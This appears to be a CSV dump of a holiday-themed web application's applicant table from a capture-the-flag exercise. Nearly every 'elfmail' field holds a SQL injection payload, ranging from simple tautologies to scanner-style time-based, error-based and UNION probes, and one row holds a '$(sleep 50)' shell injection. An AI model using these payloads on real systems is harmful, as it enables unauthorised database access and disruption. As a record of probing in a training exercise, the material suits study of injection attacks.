id,name,essay,phone,whyme,status,program,elfmail
103796,bob,No,2075675309,I AM SO RAD,pending,Ornithopters,\x18 or 1=1 --
103877,ttt,,ttt,ttt,pending,ttt,\x18 or 3=3 --
188,tt,tt,tt,tt,pending,tt,<blank>
51114,<blank>,<blank>,<blank>,<blank>,pending,tt, $(sleep 50)
44209,<blank>,<blank>,<blank>,<blank>,pending,ttttttt," AND (SELECT 1068 FROM(SELECT COUNT(*),CONCAT(0x71"
44215,MySQL,6,4,5,pending,3, AND (SELECT 8131 FROM (SELECT(SLEEP(5)))Srkm)
98732,A,<blank>,<blank>,<blank>,pending,a, AND 1124=1124
98737,0,h,1,g,pending,f, AND 1124=1124-- WMfj
94916,a,f,+11111111111,e,pending,d, AND 1432=1432
94924,Jim,EXE,2456755656,Tiff,pending,qqqq, AND 1432=1432-- hJqi
91864,Kek,qqqqqqq,7896753423,qqqqq,pending,Kekology, AND 1478=1478
91872,a,b,1234567890,a,pending,abc, AND 1478=1478-- NNvp
44204,test,test,test,test,pending,test, AND 1479=8658-- tnZL
45025,test,test,test,test,complete,test, AND 1565=8011
97873,test,test,test,test,complete,, AND 1609=1609#
97872,dd,dd,dd,dd,pending,dd, AND 2419=5819#
91892,fsdfsd,345345,24223455656,45435,pending,sdfsdf, AND 2636=2636#
44201,Elle,Need penetration testing to prevent bear attacks!,2129110123,#santaknew,pending,Polar bears, AND 2678=2678
44205,A,A,1,A,pending,A, AND 2678=2678-- ECsU
94915,name,essay,0123456789,whyme,pending,program, AND 2937=7544
1670,Kek,qqqqq,9743425678,qqqq,pending,Kekology, AND 3112=3112
84026,hgffgh,xcvxcvxcv,3433433233,sdfs,pending,Er, AND 3362=3362
84030,sdfsdf,sdfsdfs,1233211234,dsfsdf,pending,ssdfsdf, AND 3362=3362-- AcNj
45030,Test,essay,12345,20,pending,Course, AND 3447=1720-- YBMg
45026,barny,test,999999999,test,pending,nothing, AND 4137=4137
45031,*,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,*,*,pending,*, AND 4137=4137-- ORCV
84041,John,7,731-555-9999,7,pending,Cookies, AND 4218=8734#
94923,Jane,7,777,7,pending,Cookie, AND 4724=8895-- gzLa
84042,sdfsdf,234,3455435656,234,pending,sdfsdf, AND 4899=4899#
84029,barny,test,999999999,test,select * from applications,nothing, AND 4926=2925-- iojy
1667,yeah,words,12312341234,no,pending,ya know, AND 5763=2337
45044,d,f,f,f,pending,f, AND 5886=5886#
97856,KMS,qqqqqqq,6748924578,qqqq,pending,Kekology, AND 6133=9139
84025,Test,tttt,12345,test,pending,test, AND 6850=1675
97860,barny,test,999999999,test,show tables,nothing, AND 7006=8892-- LgXI
91871,barny,test,999999999,test,select * from  krampus,nothing, AND 7121=1962-- oIod
98730,Sarah,7,7,7,pending,Cookies, AND 7146=8898
45043,cheech,test,test,test,pending,test, AND 7335=5210#
44200,1,looks good,3224343434,good looks,pending,Semantics, AND 7371=7450
91863,elfie,im an elf for sure,9193335555,im good at elfing,test,test, AND 7596=1438
98736,<blank>,<blank>,<blank>,<blank>,pending,"test’,(select name from applications limit 0,1),", AND 7746=6818-- Emlp
97857,<blank>,<blank>,<blank>,<blank>,pending,"test’,(select name from applications limit 0,1),", AND 8240=8240
97861,d,f,f,f,pending,f, AND 8240=8240-- YXRJ
91891,barny,test,999,test,pen,show tables, AND 8508=6104#
103805,<blank>,<blank>,<blank>,<blank>,pending,"test’,’test’,(select version()))-- -"," or 0=0 #"""
103813,firstname,essay,0123456789,description,pending,study," or 1=1 or """"="
103788,barny,test,999999999,test,(select elfmail from applicati,test, or a = a
103814,<blank>,<blank>,<blank>,<blank>,pending,test’;(select version()))-- -, or a=a
45098,<blank>,<blank>,<blank>,<blank>,pending,test’;(select version()))-- -, OR NOT 3181=3181#
84095,barny,test,999999999,test,(show tables;) ,test, OR NOT 6136=6136#
45097,Elf,Duh,8435551234,Because I am awesome,pending,cybersecurity, OR NOT 6602=1893#
84094,barny,test,999999999,test,(select program from applicati,test, OR NOT 7089=7761#
103801,<blank>,<blank>,<blank>,<blank>,pending,<blank>, or x=x
51131,<blank>,<blank>,<blank>,<blank>,pending,"UNION SELECT 1,@@version;- -",!
51056,<blank>,<blank>,<blank>,<blank>,pending,1,"
91881,KMS,qqqqqqqqqqqqqq,6728926543,qqqqqqqqqqqqqq,pending,Kekology,""" AND 1070=7367#"
97867,KMA,qqqqqqq,7642345634,qqqq,pending,Kekology,""" AND 1609=1609#"
84035,stdent,why not,01032910,why not,pending,dreameering,""" AND 1985=1126#"
91883,studnet,whynot,039103,why not,pending,whynot,""" AND 2636=2636#"
97866,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" AND 4872=9405#"
84036,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" AND 4899=4899#"
45038,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" AND 5886=5886#"
45037,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" AND 8053=9909#"
51082,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" or ""a""=""a"
51069,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" or ""x""=""x"
51074,NBJj,<blank>,<blank>,fAQR,pending,oduh,""" or 0=0 #"
51071,test,test,1234567890,test,pending,test,""" or 0=0 --"
51081,test,test,1234567890,test,pending,test," or 1=1 or ""="
51075,test,test,1234567890,test,pending,test,""" or 1=1--"
45092,test,test,1234567890,test,pending,test,""" OR NOT 3181=3181#"
84088,test,test,1234567890,test,pending,test,""" OR NOT 5071=4841#"
45090,test,test,1234567890,test,pending,test,""" OR NOT 5368=3398#"
84089,test,test,1234567890,test,pending,test,""" OR NOT 6136=6136#"
84116,test,test,1234567890,test,pending,test,""" RLIKE (SELECT (CASE WHEN (2348=9689) THEN ' ELSE"
84117,test,test,1234567890,test,pending,test,""" RLIKE (SELECT (CASE WHEN (5956=5956) THEN ' ELSE"
45120,test,test,1234567890,test,pending,test,""" RLIKE (SELECT (CASE WHEN (7823=7823) THEN ' ELSE"
45119,test,test,1234567890,test,pending,test,""" RLIKE (SELECT (CASE WHEN (9013=4309) THEN ' ELSE"
91898,test,test,1234567890,test,pending,test,""") AND 1533=9496#"
97875,test,test,1234567890,test,pending,test,""") AND 1609=1609#"
91897,test,test,1234567890,test,pending,test,""") AND 2636=2636#"
97874,test,test,1234567890,test,pending,test,""") AND 3073=6105#"
45045,test,test,1234567890,test,pending,test,""") AND 4453=2823#"
84043,test,test,1234567890,test,pending,test,""") AND 4846=1665#"
84044,test,test,1234567890,test,pending,test,""") AND 4899=4899#"
45046,test,test,1234567890,test,pending,test,""") AND 5886=5886#"
91949,test,test,1234567890,test,pending,test,""") AS AqvB WHERE 6976=6976 AND (SELECT 5845 FROM ("
91978,test,test,1234567890,test,pending,test,""") AS Avla WHERE 7031=7031 OR ELT(4754=4754,SLEEP("
91975,test,test,1234567890,test,pending,test,""") AS bWyi WHERE 5231=5231 OR ELT(9202=9202,SLEEP("
91931,test,test,1234567890,test,pending,test,""") AS CFdX WHERE 3137=3137 OR UPDATEXML(8645,CONCA"
97885,test,test,1234567890,test,pending,test,""") AS cszA WHERE 4111=4111 AND 1609=1609#"
91959,test,test,1234567890,test,pending,test,""") AS Cwqg WHERE 7549=7549 OR (SELECT 6880 FROM (S"
92060,test,test,1234567890,test,pending,test,""") AS DUms WHERE 6584=6584 UNION ALL SELECT NULL,N"
92024,blah,blah,blh,blah,pending,blah,""") AS eFRY WHERE 7537=7537 UNION ALL SELECT 61,61,"
91982,a,a,a,a,pending,a,""") AS eiCA WHERE 9210=9210 ORDER BY 8629#"
91948,<blank>,blah,0123456789,blah,pending,blah,""") AS EqrV WHERE 9105=9105;SELECT BENCHMARK(500000"
91929,John,test,731-551-0000,test,pending,Cookie Making,""") AS eRAF WHERE 8047=8047 AND UPDATEXML(3133,CONC"
92021,Krishnendu,NA,123456789,NA,pending,elfu,""") AS eyaR WHERE 7589=7589 UNION ALL SELECT 61,CON"
91967,Wardawg,qqqqq,3427854567,qqqq,pending,Kekology,""") AS eZXA WHERE 6694=6694 RLIKE SLEEP(5)-- eAEo"
91924,Wardawg,qqqqq,7642345634,qqqq,pending,Kekology,""") AS FEYE WHERE 7491=7491 OR JSON_KEYS((SELECT CO"
91947,sparkie,looks good,3224343434,good looks,pending,Semantics,""") AS FSwG WHERE 7568=7568;SELECT BENCHMARK(500000"
92073,first,ess,555-5555,dec,pending,course,""") AS gbvJ WHERE 8236=8236 UNION ALL SELECT NULL,N"
92022,Wardawg,aaaaaaaaaaaaaaa,7642345634,aaaaaaaaaaaaaa,pending,REEEEEE,""") AS GeTg WHERE 4434=4434 UNION ALL SELECT CONCAT"
45056,A,A,A,A,pending,A,""") AS gJZS WHERE 6812=6812 AND 5886=5886#"
92075,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS HftY WHERE 9374=9374 UNION ALL SELECT NULL,N"
92072,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS Hmzu WHERE 5980=5980 UNION ALL SELECT NULL,N"
91989,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS Hpdk WHERE 9529=9529 UNION ALL SELECT NULL,N"
84107,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS HzZE WHERE 7028=7028 OR NOT 6136=6136#"
91912,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS ijen WHERE 6572=6572 AND 8693=4248#"
91945,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS JaQB WHERE 8843=8843;(SELECT * FROM (SELECT("
92053,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS JBou WHERE 8011=8011 UNION ALL SELECT NULL,N"
91983,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS JbXQ WHERE 1119=1119 ORDER BY 10#"
91965,ZAP,<blank>,9999999999,<blank>,pending,ZAP,""") AS jGLx WHERE 7876=7876 OR 1218=BENCHMARK(50000"
91955,Wardawg,aaaaaaaaaaaaaaa,7642345634,aaaaaaaaaaaaaa,pending,REEEEEE,""") AS jZMr WHERE 8785=8785 OR SLEEP(5)-- uRpx"
91927,REEEEEEEEEEEEEEEEEEEEEE,REEEEEEEEEEEEEEEEE,REEE,REEE,pending,REE,""") AS KfcX WHERE 1713=1713 OR (SELECT 9474 FROM(SE"
92031,REEEEEEEEEEEEEEEEEEEEEE,REEEEEEEEEEEEEEEEE,REEE,REEE,pending,REE,""") AS kGmz WHERE 1182=1182 UNION ALL SELECT 61,61,"
92034,aaaaa,No way mate,00112233,because becausebecausebecausebecausebecausebecause because because because,pending,aaaaa,""") AS KpqN WHERE 3820=3820 UNION ALL SELECT 61,61,"
45110,test,test,123456,test,pending,test,""") AS KpSX WHERE 8627=8627 OR NOT 3181=3181#"
92000,Chris,qqqqqqq,7642345634,qqqqq,pending,Kekology,""") AS kzMM WHERE 1760=1760 UNION ALL SELECT NULL,N"
91968,Fritz,Oh noo ... this is work,1234567890,I am the very good at,pending,Dentist,""") AS lIgp WHERE 1077=1077 RLIKE SLEEP(5)#"
84106,<blank>,<blank>,<blank>,asdas,pending,hellp,""") AS LKBZ WHERE 6566=6566 OR NOT 8685=5197#"
45055,a,2,0,1,pending,g,""") AS LPZM WHERE 6828=6828 AND 5174=7508#"
92061,a,<blank>,g,h,accepted,i,""") AS lRWw WHERE 9060=9060 UNION ALL SELECT NULL,N"
91961,<blank>,<blank>,<blank>,<blank>,pending new,ddd,""") AS mUVi WHERE 7117=7117 AND 4053=BENCHMARK(5000"
91976,<blank>,<blank>,<blank>,<blank>,newpending,ddd,""") AS NAYJ WHERE 5159=5159 AND ELT(5204=5204,SLEEP"
91974,<blank>,<blank>,<blank>,<blank>,pending,ddd,""") AS nEKc WHERE 5388=5388 AND ELT(8508=8508,SLEEP"
91951,krampus,krampus,01029841,krampue,pending,dreameering,""") AS NHkP WHERE 5653=5653 OR (SELECT 6189 FROM (S"
92029,<blank>,<blank>,<blank>,<blank>,not pending,ddd,""") AS nIYw WHERE 4800=4800 UNION ALL SELECT CONCAT"
91994,Test,33,123,33,pending,e,""") AS nJtA WHERE 7286=7286 UNION ALL SELECT CONCAT"
91943,Test,33,123,33,pending,e,""") AS nLLT WHERE 5775=5775;(SELECT * FROM (SELECT("
91992,Test,33,123,33,pending,e,""") AS OGWf WHERE 7586=7586 UNION ALL SELECT NULL,N"
91932,Test,33,123,33,pending,e,""") AS otnr WHERE 9533=9533 AND ROW(4649,5002)>(SEL"
91919,Test,33,123,33,pending,e,""") AS PcXJ WHERE 1295=1295 OR (SELECT 2*(IF((SELEC"
91962,Test,33,123,33,pending,e,""") AS PfXb WHERE 6011=6011 OR 2387=BENCHMARK(50000"
92067,Test,33,123,33,pending,e,""") AS PGGA WHERE 1578=1578 UNION ALL SELECT NULL,N"
45109,Test,33,123,33,pending,e,""") AS PLxe WHERE 4704=4704 OR NOT 1543=4068#"
91980,Test,33,123,33,pending,e,""") AS qaRz WHERE 4497=4497 PROCEDURE ANALYSE(EXTRA"
91970,Test,33,123,33,pending,e,""") AS qjmN WHERE 7103=7103 RLIKE (SELECT 5717 FROM"
92081,Test,33,123,33,pending,e,""") AS QuZw WHERE 2832=2832 UNION ALL SELECT NULL,N"
84053,Test,33,123,33,pending,e,""") AS QzAU WHERE 1594=1594 AND 3421=2111#"
92068,Test,33,123,33,pending,e,""") AS qzpL WHERE 4543=4543 UNION ALL SELECT NULL,N"
91925,Test,33,123,33,pending,e,""") AS rIVC WHERE 2349=2349 AND (SELECT 4622 FROM(S"
92001,Test,33,123,33,pending,e,""") AS RQOa WHERE 8302=8302 UNION ALL SELECT CONCAT"
91920,Test,33,123,33,pending,e,""") AS rSWQ WHERE 4582=4582 AND EXP(~(SELECT * FROM"
92065,Test,33,123,33,pending,e,""") AS RvjH WHERE 3752=3752 UNION ALL SELECT NULL,N"
92032,Test,33,123,33,pending,e,""") AS rXKs WHERE 6842=6842 UNION ALL SELECT 61,61,"
92054,Test,33,123,33,pending,e,""") AS SsBX WHERE 7781=7781 UNION ALL SELECT NULL,N"
91972,Test,33,123,33,pending,e,""") AS TCTv WHERE 5814=5814 RLIKE (SELECT 7724 FROM"
84054,Test,33,123,33,pending,e,""") AS TLds WHERE 8381=8381 AND 4899=4899#"
92077,Test,33,123,33,pending,e,""") AS ugea WHERE 6936=6936 UNION ALL SELECT NULL,N"
91998,Test,33,123,33,pending,e,""") AS uGKY WHERE 7241=7241 UNION ALL SELECT NULL,N"
91923,Test,33,123,33,pending,e,""") AS UTgW WHERE 5139=5139 AND JSON_KEYS((SELECT C"
92063,Test,33,123,33,pending,e,""") AS UWIT WHERE 9293=9293 UNION ALL SELECT NULL,N"
91991,Test,33,123,33,pending,e,""") AS VuAO WHERE 3545=3545 UNION ALL SELECT NULL,C"
92079,Test,33,123,33,pending,e,""") AS Vwmo WHERE 5022=5022 UNION ALL SELECT NULL,N"
91939,Test,33,123,33,pending,e,""") AS wgZJ WHERE 7639=7639;SELECT SLEEP(5)#"
92056,Test,33,123,33,pending,e,""") AS wqcc WHERE 9441=9441 UNION ALL SELECT NULL,N"
92070,Test,33,123,33,pending,e,""") AS wZbs WHERE 4151=4151 UNION ALL SELECT NULL,N"
91985,Test,33,123,33,pending,e,""") AS XcJJ WHERE 2605=2605 ORDER BY 6#"
91953,Test,33,123,33,pending,e,""") AS xdiF WHERE 8547=8547 AND SLEEP(5)-- otoh"
91921,Test,33,123,33,pending,e,""") AS xLgR WHERE 8147=8147 OR EXP(~(SELECT * FROM "
91941,Test,33,123,33,pending,e,""") AS YISZ WHERE 7848=7848;SELECT SLEEP(5)-- YvyY"
91999,Test,33,123,33,pending,e,""") AS YjdB WHERE 5295=5295 UNION ALL SELECT NULL,C"
92027,Test,33,123,33,pending,e,""") AS yKrg WHERE 4047=4047 UNION ALL SELECT 61,CON"
91996,Test,33,123,33,pending,e,""") AS YmQE WHERE 2957=2957 UNION ALL SELECT NULL,N"
92058,Test,33,123,33,pending,e,""") AS yNbL WHERE 9568=9568 UNION ALL SELECT NULL,N"
97884,Test,33,123,33,pending,e,""") AS zdXC WHERE 7939=7939 AND 6376=1765#"
91917,Test,33,123,33,pending,e,""") AS ZELW WHERE 9819=9819 AND (SELECT 2*(IF((SELE"
92082,Test,33,123,33,pending,e,""") AS zHAP WHERE 2367=2367 UNION ALL SELECT NULL,N"
91963,Test,33,123,33,pending,e,""") AS zIyB WHERE 4996=4996 AND 3134=BENCHMARK(5000"
91937,Test,33,123,33,pending,e,""") AS zXHA WHERE 5816=5816 PROCEDURE ANALYSE(EXTRA"
51083,Test,33,123,33,pending,e,""") or (""a""=""a"
45100,Test,33,123,33,pending,e,""") OR NOT 3181=3181#"
84097,Test,33,123,33,pending,e,""") OR NOT 6136=6136#"
45099,Test,33,123,33,pending,e,""") OR NOT 8641=9436#"
84096,Test,33,123,33,pending,e,""") OR NOT 9856=8805#"
97877,Test,33,123,33,pending,e,""")) AND 1609=1609#"
91901,Test,33,123,33,pending,e,""")) AND 2636=2636#"
84046,Test,33,123,33,pending,e,""")) AND 4899=4899#"
45047,Test,33,123,33,pending,e,""")) AND 5263=5667#"
45048,Test,33,123,33,pending,e,""")) AND 5886=5886#"
91899,Test,33,123,33,pending,e,""")) AND 6996=3202#"
84045,Test,33,123,33,pending,e,""")) AND 8462=6098#"
97876,Test,33,123,33,pending,e,""")) AND 8692=8637#"
84050,Test,33,123,33,pending,e,""")) AS DyaT WHERE 4301=4301 AND 4899=4899#"
45052,Test,33,123,33,pending,e,""")) AS fKaq WHERE 7914=7914 AND 5886=5886#"
84049,Test,33,123,33,pending,e,""")) AS KnIW WHERE 7058=7058 AND 6307=9660#"
84103,Test,33,123,33,pending,e,""")) AS KReF WHERE 1774=1774 OR NOT 6136=6136#"
91905,Test,33,123,33,pending,e,""")) AS nFzH WHERE 9311=9311 AND 4364=7433#"
97880,Test,33,123,33,pending,e,""")) AS QIEW WHERE 1428=1428 AND 9501=6409#"
45106,Test,33,123,33,pending,e,""")) AS rEfX WHERE 2007=2007 OR NOT 3181=3181#"
84102,Test,33,123,33,pending,e,""")) AS rNdi WHERE 9645=9645 OR NOT 4603=9220#"
97881,Test,33,123,33,pending,e,""")) AS vDFF WHERE 7699=7699 AND 1609=1609#"
45105,Test,33,123,33,pending,e,""")) AS veki WHERE 5115=5115 OR NOT 1723=4898#"
91906,Test,33,123,33,pending,e,""")) AS VIPb WHERE 6024=6024 AND 2636=2636#"
45051,Test,33,123,33,pending,e,""")) AS WPJi WHERE 9297=9297 AND 2359=6232#"
84098,Test,33,123,33,pending,e,""")) OR NOT 2178=8421#"
45102,Test,33,123,33,pending,e,""")) OR NOT 3181=3181#"
84099,Test,33,123,33,pending,e,""")) OR NOT 6136=6136#"
45101,Test,33,123,33,pending,e,""")) OR NOT 6151=3612#"
97879,Test,33,123,33,pending,e,"""))) AND 1609=1609#"
84048,Test,33,123,33,pending,e,"""))) AND 4899=4899#"
45050,Test,33,123,33,pending,e,"""))) AND 5886=5886#"
97878,Test,33,123,33,pending,e,"""))) AND 6054=6686#"
45049,Test,33,123,33,pending,e,"""))) AND 7193=7381#"
84047,Test,33,123,33,pending,e,"""))) AND 9114=3864#"

